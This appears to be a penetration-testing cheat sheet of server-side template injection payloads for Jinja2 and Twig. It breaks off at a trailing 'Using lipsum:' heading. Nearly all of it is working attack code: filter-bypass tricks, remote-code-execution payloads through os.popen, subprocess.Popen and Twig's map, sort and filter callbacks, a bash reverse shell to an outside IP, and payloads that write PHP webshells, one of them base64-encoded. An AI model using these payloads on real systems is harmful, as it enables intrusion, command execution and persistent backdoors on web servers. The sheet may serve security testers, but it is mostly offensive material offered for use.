Jinja2 filter bypass techniques:

Bypass underscore filter using |attr() filter:
{{()|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}

Bypass dot notation with dictionary access:
{{request['application']['__globals__']['__builtins__']['__import__']('os').popen('id').read()}}

Pass underscored attr names via GET parameter (avoids filter in URL/body):
# GET /?c=__class__
{{()|attr(request.args.c)|attr(request.args.m)()|attr(request.args.s)()[396](request.args.cmd,shell=True,stdout=-1).communicate()[0]}}
# request.args.c=__class__ &m=__mro__ &s=__subclasses__ &cmd=id

Encode underscores as \x5f:
{{'\x5f\x5fclass\x5f\x5f'|string}}
{{()|attr('\x5f\x5fclass\x5f\x5f')}}

Use request.args to smuggle blocked chars:
GET /?x=__class__&y=__mro__&z=__subclasses__
{{()|attr(request.args.x)|attr(request.args.y)[1]|attr(request.args.z)()}}

Bypass bracket filters with __getitem__:
{{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(396)('id',shell=True,stdout=-1).communicate()}}

Alternative — lipsum/joiner/namespace (no underscores in access path):
{{lipsum['__globals__']['os']['popen']('id')['read']()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

Twig identification:
{{7*7}}   → 49 (Twig renders it)
{{7*'7'}} → 49 (Twig; Jinja2 gives 7777777)
{{'a'~'b'}} → ab (Twig concatenation — confirms Twig)

Twig 1.x RCE via registerUndefinedFilterCallback:
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

Twig 2.x/3.x RCE via map filter:
{{['id']|map('system')|join}}
{{['id']|map('shell_exec')|join}}

Via sort filter:
{{[0]|sort('system')}}

Via filter filter:
{{'id'|filter('system')}}
{{'id'|filter('shell_exec')}}

Reverse shell:
{{['bash -c "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1"']|map('system')|join}}

Write webshell:
{{['<?php system($_GET["cmd"]);?>'|file_put_contents('/var/www/html/c.php','<?php system($_GET["cmd"]);?>')]}}

Alternative write via system:
{{['echo "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==" | base64 -d > /var/www/html/sh.php']|map('system')|join}}

Twig sandbox escape (if sandbox enabled — limited in practice):
{{_self.env.disableSandbox()}}{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

Detection — inject into every user-controllable parameter:
{{7*7}}      → 49 = Jinja2/Twig (vulnerable)
{{7*'7'}}    → 7777777 = Jinja2 | 49 = Twig (tells them apart)
${7*7}       → 49 = FreeMarker/Thymeleaf
<%= 7*7 %>   → 49 = ERB (Ruby)
#{7*7}       → 49 = FreeMarker

Jinja2 RCE via os.popen (simplest if globals accessible):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

Via request.application globals:
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

Via class hierarchy traversal:
{{''.__class__.__mro__[1].__subclasses__()}}
# Find index of <class 'subprocess.Popen'> — typically ~396 in CPython 3.8
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

Using cycler (Flask built-in, always available):
{{cycler.__init__.__globals__.os.popen('id').read()}}

Using lipsum:
